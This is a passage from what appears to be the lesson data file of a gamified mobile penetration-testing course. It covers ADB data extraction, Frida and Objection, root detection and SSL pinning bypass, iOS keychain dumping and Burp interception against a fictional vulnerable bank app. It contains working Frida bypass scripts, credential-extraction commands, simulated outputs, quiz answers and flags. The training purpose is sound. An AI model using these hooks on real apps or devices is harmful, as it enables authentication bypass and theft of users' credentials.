          'strings output/lib/arm64-v8a/libnative.so | grep -E "[A-Za-z0-9]{20,}"': `/system/lib64/libc.so\nNative_verifyLicense\nVULN{n4t1v3_l1b_s3cr3t}\ncom/vulnerable/bankapp/LicenseChecker\nhttps://license.vulnerable-bank.com/verify\nCertificate pinned SHA256: abc123def456...`,
        },
        questions: [
          { q: 'What is the flag hidden in strings.xml?', a: 'VULN{h4rdc0d3d_secr3ts_are_bad}', hint: 'Check the admin_bypass_code string', xp: 30 },
          { q: 'What database encryption key was hardcoded in strings.xml?', a: 'vuln_db_key_2024!', hint: 'Look at db_encryption_key', xp: 20 },
        ],
      },
      {
        id: 't5', title: 'ADB Data Extraction',
        xp: 30,
        content: `
<h2>ADB Data Extraction Techniques</h2>
<p>ADB (Android Debug Bridge) is your primary interface with Android devices during dynamic testing.</p>
<h3>Essential ADB Commands</h3>
<pre><code># Device management
adb devices                    # List devices
adb shell                      # Interactive shell
adb -s emulator-5554 shell     # Target specific device

# App management
adb shell pm list packages -3  # Third-party apps only
adb shell pm path com.app      # APK location
adb pull /data/app/.../base.apk  # Download APK

# Data extraction (requires root or debuggable app)
adb shell run-as com.app ls /data/data/com.app/
adb shell run-as com.app cat /data/data/com.app/shared_prefs/prefs.xml

# Backup extraction
adb backup -noapk com.vulnerable.app
dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar xf -</code></pre>
<h3>App Private Data Locations</h3>
<ul>
  <li><code>/data/data/&lt;pkg&gt;/shared_prefs/</code> — SharedPreferences XML files</li>
  <li><code>/data/data/&lt;pkg&gt;/databases/</code> — SQLite databases</li>
  <li><code>/data/data/&lt;pkg&gt;/files/</code> — Private app files</li>
  <li><code>/data/data/&lt;pkg&gt;/cache/</code> — Cached data</li>
  <li><code>/sdcard/Android/data/&lt;pkg&gt;/</code> — External storage</li>
</ul>`,
        terminalCommands: {
          'adb shell pm list packages -3': `package:com.vulnerable.bankapp\npackage:com.example.testapp\npackage:com.instagram.android`,
          'adb shell pm path com.vulnerable.bankapp': 'package:/data/app/com.vulnerable.bankapp-xyz123/base.apk',
          'adb pull /data/app/com.vulnerable.bankapp-xyz123/base.apk ./': '[100%] /data/app/com.vulnerable.bankapp-xyz123/base.apk',
          'adb shell run-as com.vulnerable.bankapp ls /data/data/com.vulnerable.bankapp/': 'cache/  code_cache/  databases/  files/  shared_prefs/',
          'adb shell run-as com.vulnerable.bankapp ls /data/data/com.vulnerable.bankapp/shared_prefs/': 'user_session.xml  app_settings.xml  credentials.xml',
          'adb shell run-as com.vulnerable.bankapp cat /data/data/com.vulnerable.bankapp/shared_prefs/credentials.xml': `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name="username">john.doe@example.com</string>\n    <string name="password">cleartext_password_123</string>\n    <string name="session_token">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.abc</string>\n    <boolean name="remember_me" value="true" />\n</map>`,
          'adb shell run-as com.vulnerable.bankapp ls /data/data/com.vulnerable.bankapp/databases/': 'vuln_bank.db  vuln_bank.db-journal',
          'adb shell "run-as com.vulnerable.bankapp sqlite3 /data/data/com.vulnerable.bankapp/databases/vuln_bank.db .tables"': 'accounts  transactions  users',
          'adb shell "run-as com.vulnerable.bankapp sqlite3 /data/data/com.vulnerable.bankapp/databases/vuln_bank.db \'SELECT * FROM users\'"': `1|admin|VULN{sq1it3_d4ta_exf1l}|admin@bank.com|1\n2|john|password123|john@example.com|0\n3|alice|alice2024|alice@example.com|0`,
        },
        questions: [
          { q: 'What sensitive data was found in credentials.xml SharedPreferences?', a: 'cleartext_password_123', hint: 'Check the password field in the XML', xp: 20 },
          { q: 'What is the flag found in the SQLite users table?', a: 'VULN{sq1it3_d4ta_exf1l}', hint: 'Check the admin password column', xp: 30 },
        ],
      },
    ],
  },

  'android-frida': {
    id: 'android-frida',
    path: 'android',
    title: 'Frida & Dynamic Instrumentation',
    description: 'Hook into live apps with Frida and Objection. Bypass root detection, SSL pinning, and modify app behaviour at runtime.',
    difficulty: 'intermediate',
    xpReward: 300,
    iconClass: 'fas fa-syringe',
    iconBg: 'rgba(168,85,247,.12)',
    iconColor: '#a855f7',
    tasks: [
      {
        id: 't1', title: 'Introduction to Frida',
        xp: 30,
        content: `
<h2>Frida — Dynamic Instrumentation Toolkit</h2>
<p><strong>Frida</strong> is the most powerful tool in mobile security. It injects a JavaScript engine into running processes, allowing you to hook functions, modify behaviour, and extract data at runtime — all without modifying the APK.</p>
<h3>How Frida Works</h3>
<ul>
  <li>A Frida <strong>server</strong> runs on the Android device (frida-server)</li>
  <li>The Frida <strong>client</strong> (frida CLI / Python) connects from your machine</li>
  <li>You inject <strong>JavaScript scripts</strong> that hook into the running app</li>
  <li>Hooks can read/modify arguments, return values, and call any method</li>
</ul>
<h3>Setup</h3>
<pre><code># Download frida-server for your device architecture
# Check arch: adb shell getprop ro.product.cpu.abi
# → arm64-v8a

# Download from: https://github.com/frida/frida/releases
adb push frida-server-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell "/data/local/tmp/frida-server &"

# Verify connection
frida-ps -U</code></pre>
<h3>Basic Frida Commands</h3>
<pre><code>frida-ps -U                    # List processes on USB device
frida -U com.target.app -l hook.js  # Attach and run script
frida -U -f com.target.app -l hook.js --no-pause  # Spawn and run</code></pre>`,
        terminalCommands: {
          'adb push frida-server-arm64 /data/local/tmp/frida-server': 'frida-server-arm64: 1 file pushed, 0 skipped. 45.2 MB/s (37,245,952 bytes in 0.787s)',
          'adb shell chmod 755 /data/local/tmp/frida-server': '',
          'adb shell "/data/local/tmp/frida-server &"': '',
          'frida-ps -U': `  PID  Name\n-----  ------------------------------------------\n  387  com.android.phone\n  512  com.android.systemui\n  834  com.vulnerable.bankapp\n  901  com.android.settings\n 1024  com.google.android.gms`,
          'frida --version': '16.2.1',
        },
        questions: [
          { q: 'What is the PID of com.vulnerable.bankapp in the process list?', a: '834', hint: 'Check the frida-ps output', xp: 15 },
          { q: 'What does Frida inject into a running process to hook functions?', a: 'javascript', hint: 'What scripting language does Frida use?', xp: 15 },
        ],
      },
      {
        id: 't2', title: 'Writing Frida Hooks',
        xp: 40,
        content: `
<h2>Frida Scripting</h2>
<p>Frida scripts are written in JavaScript and use the Frida API to intercept method calls, read/modify arguments, and change return values.</p>
<h3>Basic Hook Template</h3>
<pre><code>// hook.js
Java.perform(function() {
    // Get a reference to the class
    var LoginActivity = Java.use("com.vulnerable.bankapp.LoginActivity");

    // Hook the validatePin method
    LoginActivity.validatePin.implementation = function(pin) {
        console.log("[*] validatePin called with: " + pin);

        // Call the original and log the result
        var result = this.validatePin(pin);
        console.log("[*] Original result: " + result);

        // Return true regardless of PIN
        return true;
    };
});</code></pre>
<h3>Hooking Constructors</h3>
<pre><code>Java.perform(function() {
    var SecretManager = Java.use("com.vulnerable.bankapp.SecretManager");
    SecretManager.$init.implementation = function(key) {
        console.log("[*] SecretManager created with key: " + key);
        this.$init(key);
    };
});</code></pre>
<h3>Reading Private Fields</h3>
<pre><code>Java.perform(function() {
    Java.choose("com.vulnerable.bankapp.LoginActivity", {
        onMatch: function(instance) {
            console.log("[*] Instance found");
            // Access private field
            var adminPass = instance.ADMIN_PASSWORD.value;
            console.log("[*] Admin password: " + adminPass);
        },
        onComplete: function() {}
    });
});</code></pre>`,
        terminalCommands: {
          'frida -U -f com.vulnerable.bankapp -l hook.js --no-pause': `[*] Frida 16.2.1\n[Android Emulator::com.vulnerable.bankapp]-> \n[*] validatePin called with: 9999\n[*] Original result: false\n[*] Bypassed! Returning true\n[*] Admin password: P@ssw0rd2024!`,
          'cat hook.js': `Java.perform(function() {\n    var LoginActivity = Java.use("com.vulnerable.bankapp.LoginActivity");\n    LoginActivity.validatePin.implementation = function(pin) {\n        console.log("[*] validatePin called with: " + pin);\n        var result = this.validatePin(pin);\n        console.log("[*] Original result: " + result);\n        return true; // Bypass!\n    };\n});`,
          'cat bypass_root.js': `Java.perform(function() {\n    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");\n    RootBeer.isRooted.implementation = function() {\n        console.log("[*] Root detection bypassed!");\n        return false;\n    };\n    RootBeer.isRootedWithoutBusyBox.implementation = function() {\n        return false;\n    };\n});`,
          'frida -U -f com.vulnerable.bankapp -l bypass_root.js --no-pause': `[Android Emulator::com.vulnerable.bankapp]->\n[*] Root detection bypassed!\n[*] Root detection bypassed!\n[*] App launched successfully in non-rooted mode`,
        },
        questions: [
          { q: 'What Frida API method is used to run code in the Android Java context?', a: 'Java.perform', hint: 'All Frida Android hooks start with ___...', xp: 20 },
          { q: 'To replace a method implementation in Frida, what property do you assign a new function to?', a: 'implementation', hint: 'ClassName.methodName.___ = function() {}', xp: 20 },
        ],
      },
      {
        id: 't3', title: 'Objection Framework',
        xp: 35,
        content: `
<h2>Objection — Runtime Mobile Exploration</h2>
<p><strong>Objection</strong> is built on top of Frida and provides a powerful interactive shell for exploring and manipulating apps at runtime — without writing scripts.</p>
<h3>Starting Objection</h3>
<pre><code># Attach to running app
objection -g com.vulnerable.bankapp explore

# Inject during spawn
objection -g com.vulnerable.bankapp explore --startup-command 'android sslpinning disable'</code></pre>
<h3>Key Objection Commands</h3>
<pre><code># Inside objection shell:

# File system
ls                             # List current directory
env                            # Show app directories
cd /data/data/com.app          # Navigate

# SQLite databases
sqlite connect /data/data/com.app/databases/app.db
sqlite execute "SELECT * FROM users"

# SSL pinning bypass
android sslpinning disable

# Root detection bypass
android root disable

# Heap search
android heap search instances com.app.SecretClass
android heap execute 0x1234abcd getSecret()

# Clipboard monitoring
android clipboard monitor

# Intent monitoring
android intent launch_activity com.app.AdminActivity</code></pre>`,
        terminalCommands: {
          'objection -g com.vulnerable.bankapp explore': `Using USB device \`Android Emulator 5554\`\nAgent injected and responds ok!\n\n     _   _         _   _\n  ___| |_|_|___ ___| |_|_|___ ___\n |  _| . | | -_|  _|  _| | . |   |\n |___|___|_|___|___|_|_|_|___|_|_|\n\n     Runtime Mobile Exploration\n        by: @leonjza from @nowsecure\n\ncom.vulnerable.bankapp on (Android: 9) [usb] #`,
          'env': `Name                    Path\n----------------------  -----------------------------------------------\nFilesDir                /data/data/com.vulnerable.bankapp/files\nCacheDir                /data/data/com.vulnerable.bankapp/cache\nExternalFilesDir        /sdcard/Android/data/com.vulnerable.bankapp/files\nDatabaseDirectory       /data/data/com.vulnerable.bankapp/databases\nPackageCodePath         /data/app/com.vulnerable.bankapp/base.apk`,
          'android sslpinning disable': `(agent) Custom TrustManager ready\n(agent) Found com.android.org.conscrypt.TrustManagerImpl, overriding trustServerCertificate\n(agent) Found okhttp3.CertificatePinner, overriding check()\n(agent) Found okhttp3.CertificatePinner, overriding check$okhttp()\n[+] SSL Pinning bypass ready!`,
          'android root disable': `(agent) Disabling root detection\n(agent) Hooking RootBeer.isRooted()\n(agent) Hooking RootBeer.isRootedWithoutBusyBox()\n(agent) Hooking Build.TAGS\n[+] Root detection bypass applied!`,
          'android intent launch_activity com.vulnerable.bankapp.AdminActivity': `(agent) Starting activity: com.vulnerable.bankapp.AdminActivity\n(agent) Activity started successfully\n[*] AdminActivity launched without authentication!`,
          'ls': `/data/data/com.vulnerable.bankapp\ndrwxrwx--x databases\ndrwxrwx--x files\ndrwxrwx--x shared_prefs\ndrwxrwx--x cache`,
        },
        questions: [
          { q: 'What single Objection command disables SSL certificate pinning?', a: 'android sslpinning disable', hint: 'android ssl___ ___', xp: 25 },
          { q: 'What Objection command was used to launch the AdminActivity without authentication?', a: 'android intent launch_activity com.vulnerable.bankapp.AdminActivity', hint: 'android intent launch_activity ___', xp: 25 },
        ],
      },
      {
        id: 't4', title: 'Root Detection Bypass',
        xp: 40,
        content: `
<h2>Bypassing Root Detection</h2>
<p>Many banking and security apps detect rooted devices and refuse to run. As a pentester, you need to bypass this to test the app.</p>
<h3>Common Root Detection Techniques Apps Use</h3>
<ul>
  <li>Check for <code>/system/app/Superuser.apk</code> or <code>su</code> binary</li>
  <li>Check for test-keys in <code>Build.TAGS</code></li>
  <li>Try to execute <code>su</code> command</li>
  <li>Check for Magisk / SuperSU package names</li>
  <li>Check for root management apps (RootBeer, SafetyNet/Play Integrity)</li>
  <li>Google Play Integrity API (modern replacement for SafetyNet)</li>
</ul>
<h3>Frida Bypass Script</h3>
<pre><code>// bypass_root_detection.js
Java.perform(function() {
    // Bypass common file-based checks
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var name = this.getAbsolutePath();
        if (name.indexOf("su") !== -1 || name.indexOf("magisk") !== -1) {
            console.log("[*] Hiding: " + name);
            return false;
        }
        return this.exists();
    };

    // Bypass Build.TAGS check
    var Build = Java.use("android.os.Build");
    Build.TAGS.value = "release-keys";

    // Hook Runtime.exec to block su calls
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("[Ljava.lang.String;").implementation = function(cmd) {
        if (cmd.toString().indexOf("su") !== -1) {
            throw Java.use("java.io.IOException").$new("su not found");
        }
        return this.exec(cmd);
    };
});</code></pre>`,
        terminalCommands: {
          'frida -U -f com.vulnerable.bankapp -l bypass_root_detection.js --no-pause': `[*] Bypassing root detection...\n[*] Hiding: /system/bin/su\n[*] Hiding: /system/xbin/su\n[*] Hiding: /sbin/su\n[*] Hiding: /su/bin/su\n[*] Hiding: /data/local/xbin/su\n[*] Hiding: /system/app/Superuser.apk\n[*] Hiding: /system/app/Magisk.apk\n[*] Build.TAGS patched: release-keys\n[*] Runtime.exec hooked — su calls blocked\n[+] Root detection fully bypassed!\n[+] App now running normally`,
          'cat bypass_root_detection.js': `Java.perform(function() {\n    var File = Java.use("java.io.File");\n    File.exists.implementation = function() {\n        var path = this.getAbsolutePath();\n        if (path.indexOf("su") > -1 || path.indexOf("magisk") > -1) {\n            return false;\n        }\n        return this.exists();\n    };\n    var Build = Java.use("android.os.Build");\n    Build.TAGS.value = "release-keys";\n    console.log("[+] Root detection bypassed!");\n});`,
          'objection -g com.vulnerable.bankapp explore --startup-command "android root disable"': `Using USB device\nAgent injected and responds ok!\n(agent) Disabling root detection\n(agent) Hooking Build.TAGS\n(agent) Hooking common su file checks\n[+] Root detection bypass applied!\n\ncom.vulnerable.bankapp on (Android: 9) [usb] #`,
        },
        questions: [
          { q: 'What Build field is commonly checked for root detection that we patch to "release-keys"?', a: 'Build.TAGS', hint: 'android.os.___.___', xp: 20 },
          { q: 'What Objection startup command automatically disables root detection?', a: 'android root disable', hint: 'android ___ ___', xp: 20 },
        ],
      },
      {
        id: 't5', title: 'SSL Pinning Bypass',
        xp: 50,
        content: `
<h2>Bypassing SSL Certificate Pinning</h2>
<p>Certificate pinning prevents MitM attacks by ensuring the app only trusts specific certificates. To intercept traffic with Burp Suite, we must bypass this.</p>
<h3>Types of SSL Pinning</h3>
<ul>
  <li><strong>Certificate Pinning</strong> — Pins the exact certificate (less common)</li>
  <li><strong>Public Key Pinning</strong> — Pins the public key (more flexible)</li>
  <li><strong>OkHttp CertificatePinner</strong> — Most common in modern Android apps</li>
  <li><strong>TrustKit</strong> — HPKP implementation for Android/iOS</li>
  <li><strong>Custom TrustManager</strong> — App-specific SSL validation</li>
</ul>
<h3>Frida SSL Pinning Bypass</h3>
<pre><code>// ssl_bypass.js — Universal bypass
Java.perform(function() {
    // Bypass OkHttp3 certificate pinning
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload(
            "java.lang.String", "java.util.List"
        ).implementation = function(hostname, peerCertificates) {
            console.log("[*] OkHttp3 pinning bypassed for: " + hostname);
        };
    } catch(e) { console.log("OkHttp3 not found"); }

    // Bypass custom TrustManager
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    TrustManagerImpl.verifyChain.implementation = function(
        untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData
    ) {
        console.log("[*] TrustManager bypassed for: " + host);
        return untrustedChain;
    };
});</code></pre>
<div class="success-box"><i class="fas fa-check-circle"></i> After bypassing pinning, configure Burp Suite as your HTTP proxy (device proxy settings → your IP:8080) to see all traffic.</div>`,
        terminalCommands: {
          'frida -U -f com.vulnerable.bankapp -l ssl_bypass.js --no-pause': `[*] SSL Pinning bypass script loaded\n[*] OkHttp3 CertificatePinner hooked\n[*] TrustManagerImpl hooked\n[*] X509TrustManager hooked\n\n--- Intercepted Traffic ---\n[*] OkHttp3 pinning bypassed for: api.vulnerable-bank.com\n[*] Request: POST https://api.vulnerable-bank.com/v1/login\n[*] Response: 200 OK {"token":"eyJhbGci...","user":"admin","flag":"VULN{ssl_p1nn1ng_byp4ss3d}"}`,
          'objection -g com.vulnerable.bankapp explore --startup-command "android sslpinning disable"': `Using USB device\nAgent injected and responds ok!\n(agent) Found okhttp3.CertificatePinner, overriding check()\n(agent) Found okhttp3.CertificatePinner, overriding check$okhttp()\n(agent) Found custom TrustManager, overriding\n[+] SSL Pinning disabled!\n\ncom.vulnerable.bankapp on (Android: 9) [usb] #`,
          'cat ssl_bypass.js': `// Universal SSL Pinning Bypass\nJava.perform(function() {\n    var CertificatePinner = Java.use("okhttp3.CertificatePinner");\n    CertificatePinner.check.overload("java.lang.String","java.util.List")\n    .implementation = function(h, c) {\n        console.log("[+] SSL bypass: " + h);\n    };\n});`,
        },
        questions: [
          { q: 'What flag was found in the intercepted API response?', a: 'VULN{ssl_p1nn1ng_byp4ss3d}', hint: 'Check the Response line in the frida output', xp: 40 },
          { q: 'What OkHttp3 class handles certificate pinning that we hook?', a: 'CertificatePinner', hint: 'okhttp3.___ ', xp: 20 },
        ],
      },
    ],
  },

  /* ══════════════════════════════════════════════════════════════════
     iOS PATH
     ══════════════════════════════════════════════════════════════════ */

  'ios-fundamentals': {
    id: 'ios-fundamentals',
    path: 'ios',
    title: 'iOS Security Fundamentals',
    description: 'Learn iOS security architecture, IPA structure, code signing, and set up your iOS hacking environment.',
    difficulty: 'intermediate',
    xpReward: 200,
    iconClass: 'fab fa-apple',
    iconBg: 'rgba(160,196,255,.12)',
    iconColor: '#a0c4ff',
    tasks: [
      {
        id: 't1', title: 'iOS Security Architecture',
        xp: 25,
        content: `
<h2>iOS Security Architecture</h2>
<p>iOS uses a layered security model with multiple hardware and software protections that make it harder to analyze than Android.</p>
<h3>Key Security Features</h3>
<ul>
  <li><strong>Secure Enclave Processor (SEP)</strong> — Dedicated processor for cryptographic operations, TouchID/FaceID data</li>
  <li><strong>Data Protection</strong> — File encryption tied to device passcode and Secure Enclave</li>
  <li><strong>Code Signing</strong> — All binaries must be signed with an Apple-trusted certificate</li>
  <li><strong>Sandboxing</strong> — Each app in its own container with strict access controls</li>
  <li><strong>ASLR + PIE</strong> — Address Space Layout Randomization, Position Independent Executables</li>
  <li><strong>Stack Canaries</strong> — Buffer overflow protection</li>
  <li><strong>ARC</strong> — Automatic Reference Counting to reduce memory bugs</li>
</ul>
<h3>iOS App Sandbox</h3>
<p>Each iOS app runs in its own container at:</p>
<pre><code>/var/mobile/Containers/Data/Application/&lt;UUID&gt;/
├── Documents/     # User data, backed up to iCloud
├── Library/
│   ├── Preferences/  # NSUserDefaults / plists
│   ├── Caches/       # Cached data
│   └── Application Support/
└── tmp/           # Temporary files</code></pre>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> Unlike Android, iOS requires a <strong>jailbroken device</strong> for most security testing.</div>`,
        terminalCommands: {
          'help': 'Try: ssh, ls, find, strings commands',
          'ssh root@192.168.1.100': 'root@192.168.1.100\'s password: \niPhone:~ root#',
          'uname -a': 'Darwin iPhone 22.0.0 Darwin Kernel Version 22.0.0 root:xnu-8792.0.0~1/RELEASE_ARM64 arm64',
          'ls /var/mobile/Containers/Data/Application/ | head -5': `3A2B1C4D-5E6F-7890-ABCD-EF1234567890\n7F8E9D0A-1B2C-3D4E-5F67-890ABCDEF123\nABCDEF12-3456-7890-ABCD-EF0987654321`,
        },
        questions: [
          { q: 'What Apple processor handles cryptographic operations and biometric data?', a: 'Secure Enclave', hint: 'SEP stands for Secure ___ Processor', xp: 15 },
          { q: 'In which directory is iOS app user data stored (that gets backed up to iCloud)?', a: 'Documents', hint: 'It\'s inside the app container...', xp: 15 },
        ],
      },
      {
        id: 't2', title: 'IPA Analysis',
        xp: 30,
        content: `
<h2>IPA File Analysis</h2>
<p>An <strong>IPA (iOS App Store Package)</strong> is the iOS equivalent of APK — a ZIP archive containing the compiled app.</p>
<h3>IPA Structure</h3>
<pre><code>target.ipa
└── Payload/
    └── TargetApp.app/
        ├── TargetApp          # Mach-O binary (compiled code)
        ├── Info.plist         # App metadata and configuration
        ├── embedded.mobileprovision  # Provisioning profile
        ├── Frameworks/        # Embedded frameworks
        ├── _CodeSignature/    # Code signing info
        │   └── CodeResources
        └── Resources/         # Assets, storyboards, nib files</code></pre>
<h3>Extracting and Analysing</h3>
<pre><code># Rename and unzip
cp target.ipa target.zip
unzip target.zip -d target_extracted/

# List the Mach-O binary
file target_extracted/Payload/TargetApp.app/TargetApp

# Check binary protections
otool -hv TargetApp     # Mach-O headers
otool -l TargetApp | grep STACK  # Stack canaries
rabin2 -I TargetApp     # All protections (from radare2)</code></pre>
<h3>Analysing Info.plist</h3>
<pre><code># Convert binary plist to readable XML
plutil -convert xml1 Info.plist -o Info_readable.xml
cat Info_readable.xml</code></pre>`,
        terminalCommands: {
          'unzip target.ipa -d target_extracted/': `Archive:  target.ipa\n  inflating: target_extracted/Payload/VulnBankiOS.app/VulnBankiOS\n  inflating: target_extracted/Payload/VulnBankiOS.app/Info.plist\n  inflating: target_extracted/Payload/VulnBankiOS.app/embedded.mobileprovision\n  inflating: target_extracted/Payload/VulnBankiOS.app/Frameworks/Alamofire.framework/Alamofire`,
          'file target_extracted/Payload/VulnBankiOS.app/VulnBankiOS': 'target_extracted/Payload/VulnBankiOS.app/VulnBankiOS: Mach-O 64-bit executable arm64',
          'plutil -convert xml1 target_extracted/Payload/VulnBankiOS.app/Info.plist -o Info.xml && cat Info.xml': `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"...>\n<plist version="1.0">\n<dict>\n  <key>CFBundleIdentifier</key>\n  <string>com.vulnbank.ios</string>\n  <key>CFBundleVersion</key>\n  <string>1.0.3</string>\n  <key>NSAppTransportSecurity</key>\n  <dict>\n    <key>NSAllowsArbitraryLoads</key>\n    <true/>\n  </dict>\n  <key>UIBackgroundModes</key>\n  <array><string>remote-notification</string></array>\n</dict>\n</plist>`,
          'strings target_extracted/Payload/VulnBankiOS.app/VulnBankiOS | grep -i "password\\|secret\\|key\\|token"': `DB_PASSWORD=vulnios_db_pass\nAPI_SECRET_KEY=ios_api_key_2024\nHARDCODED_TOKEN=IOS{h4rdc0d3d_1n_b1n4ry}\nkeychain_service_name=com.vulnbank.ios.keychain`,
        },
        questions: [
          { q: 'What dangerous NSAppTransportSecurity setting was found in Info.plist?', a: 'NSAllowsArbitraryLoads', hint: 'It allows arbitrary (insecure) HTTP loads', xp: 20 },
          { q: 'What flag was found hardcoded in the iOS binary?', a: 'IOS{h4rdc0d3d_1n_b1n4ry}', hint: 'Check the strings output for HARDCODED_TOKEN', xp: 30 },
        ],
      },
      {
        id: 't3', title: 'Frida on iOS',
        xp: 40,
        content: `
<h2>Frida on iOS</h2>
<p>Frida works on iOS too — once installed on a jailbroken device, you can hook Objective-C and Swift methods just like Java methods on Android.</p>
<h3>iOS Frida Setup (Jailbroken Device)</h3>
<pre><code># Install Frida via Cydia/Sileo
# Source: https://build.frida.re

# Or via SSH from Kali
pip3 install frida-tools

# List iOS processes
frida-ps -U  # USB-connected device</code></pre>
<h3>Hooking Objective-C Methods</h3>
<pre><code>// hook_ios.js
// Hook Objective-C method
var hook = ObjC.classes.LoginViewController["- validatePassword:"];
Interceptor.attach(hook.implementation, {
    onEnter: function(args) {
        // args[0] = self, args[1] = selector, args[2] = first arg
        var password = ObjC.Object(args[2]);
        console.log("[*] validatePassword called: " + password);
        // Force return YES (true)
        args[2] = ptr(1);
    },
    onLeave: function(retval) {
        retval.replace(ptr(1)); // Return YES
        console.log("[*] Bypass: returning YES");
    }
});</code></pre>
<h3>Keychain Dumping</h3>
<pre><code># Dump keychain data with objection
objection -g com.vulnbank.ios explore
ios keychain dump</code></pre>`,
        terminalCommands: {
          'frida-ps -U | grep -i vulnbank': '  512  VulnBankiOS',
          'frida -U -f com.vulnbank.ios -l hook_ios.js --no-pause': `[*] Frida 16.2.1\n[iPhone::com.vulnbank.ios]->\n[*] validatePassword called: wrongpassword\n[*] Bypass: returning YES\n[*] Authentication bypassed!\n[+] Logged in as admin`,
          'objection -g com.vulnbank.ios explore': `Using USB device \`iPhone\`\nAgent injected and responds ok!\n\ncom.vulnbank.ios on (iOS: 16.2) [usb] #`,
          'ios keychain dump': `save file? [y/N]: n\n\nType       | Account                  | Service              | Data\n---------- | ------------------------ | -------------------- | --------\ngenericPwd | admin@vulnbank.com       | com.vulnbank.ios     | S3cureP@ss!\ngenericPwd | api_user                 | com.vulnbank.api     | IOS{k3ycha1n_dump3d}\ninternetPwd| john@example.com         | vulnbank.com         | Password123!`,
          'ios nsuserdefaults get': `Name                              Value\n--------------------------------  ----------------------------------------\ncom.vulnbank.ios.user_token       eyJhbGciOiJIUzI1NiJ9.admin.abc123\ncom.vulnbank.ios.remember_me      true\ncom.vulnbank.ios.debug_enabled    true`,
        },
        questions: [
          { q: 'What flag was found in the iOS Keychain?', a: 'IOS{k3ycha1n_dump3d}', hint: 'Check the api_user keychain entry', xp: 35 },
          { q: 'What Objection command dumps all stored Keychain items?', a: 'ios keychain dump', hint: 'ios ___ ___', xp: 20 },
        ],
      },
    ],
  },

  /* ══════════════════════════════════════════════════════════════════
     NETWORK PATH
     ══════════════════════════════════════════════════════════════════ */

  'network-setup': {
    id: 'network-setup',
    path: 'network',
    title: 'Intercepting Mobile Traffic',
    description: 'Configure Burp Suite as a MitM proxy for Android and iOS devices to capture and modify HTTPS traffic.',
    difficulty: 'beginner',
    xpReward: 150,
    iconClass: 'fas fa-network-wired',
    iconBg: 'rgba(168,85,247,.12)',
    iconColor: '#a855f7',
    tasks: [
      {
        id: 't1', title: 'Burp Suite Mobile Setup',
        xp: 30,
        content: `
<h2>Intercepting Mobile HTTPS with Burp Suite</h2>
<p>Burp Suite acts as a <strong>Man-in-the-Middle (MitM) proxy</strong>, intercepting all HTTP/HTTPS traffic between the mobile app and its backend servers.</p>
<h3>Setup Steps</h3>
<ol>
  <li>Open Burp Suite → Proxy → Options → Add listener on <code>0.0.0.0:8080</code></li>
  <li>Connect mobile device to the <strong>same WiFi network</strong> as your laptop</li>
  <li>On Android: Settings → WiFi → Long press network → Modify → Proxy → Manual → enter your laptop IP, port 8080</li>
  <li>Export Burp CA cert: Proxy → CA Certificate → Download DER/PEM</li>
  <li>Install CA on Android: Settings → Security → Install Certificate → Burp CA</li>
</ol>
<h3>Verify the Setup</h3>
<pre><code># On the device, browse to:
http://burpsuite/  # (special Burp URL to download cert)

# Check proxy is working
curl -x 192.168.1.100:8080 https://example.com -k</code></pre>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> Android 7+ (API 24+) no longer trusts user-installed CA certs for apps. You need to either be root, patch the APK's network security config, or use the network_security_config bypass.</div>
<h3>Network Security Config Bypass (No Root)</h3>
<pre><code># Decompile APK with APKTool
apktool d target.apk -o target_decoded/

# Create res/xml/network_security_config.xml
echo '&lt;network-security-config&gt;&lt;base-config&gt;&lt;trust-anchors&gt;
  &lt;certificates src="system"/&gt;&lt;certificates src="user"/&gt;
&lt;/trust-anchors&gt;&lt;/base-config&gt;&lt;/network-security-config&gt;' > target_decoded/res/xml/network_security_config.xml

# Add to AndroidManifest.xml application tag:
# android:networkSecurityConfig="@xml/network_security_config"

# Rebuild and sign
apktool b target_decoded/ -o patched.apk
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore test.keystore patched.apk test</code></pre>`,
        terminalCommands: {
          'curl -x 192.168.1.100:8080 http://api.vulnerable-bank.com/v1/info -v': `*   Trying 192.168.1.100:8080...\n* Connected to 192.168.1.100 (192.168.1.100) port 8080\n> GET http://api.vulnerable-bank.com/v1/info HTTP/1.1\n> Host: api.vulnerable-bank.com\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n<\n{"version":"1.0","env":"production","debug":true}`,
          'apktool d target.apk -o target_decoded/': 'I: Using Apktool 2.9.3\nI: Decoding...\nI: Done.',
          'apktool b target_decoded/ -o patched.apk': 'I: Using Apktool 2.9.3\nI: Building apk file...\nI: Built apktool.apk into: patched.apk',
          'adb install patched.apk': 'Performing Incremental Install\nStreaming install\nSuccess',
        },
        questions: [
          { q: 'What default port does Burp Suite proxy listen on?', a: '8080', hint: 'It\'s the standard HTTP alternate port', xp: 15 },
          { q: 'What Android API level introduced restrictions on user-installed CA certificates?', a: '24', hint: 'Android 7 = API ___', xp: 20 },
        ],
      },
      {
        id: 't2', title: 'Traffic Analysis',
        xp: 35,
        content: `
<h2>Analysing Intercepted Mobile Traffic</h2>
<p>Once traffic is flowing through Burp, you can identify vulnerabilities in the API and communication layer.</p>
<h3>What to Look For</h3>
<ul>
  <li><strong>Authentication tokens</strong> — JWT, API keys, session cookies in headers</li>
  <li><strong>Sensitive data in transit</strong> — PII, financial data, health info</li>
  <li><strong>Insecure HTTP</strong> — Any endpoint using HTTP instead of HTTPS</li>
  <li><strong>Verbose error messages</strong> — Stack traces exposing server internals</li>
  <li><strong>IDOR</strong> — Insecure Direct Object Reference (changing IDs)</li>
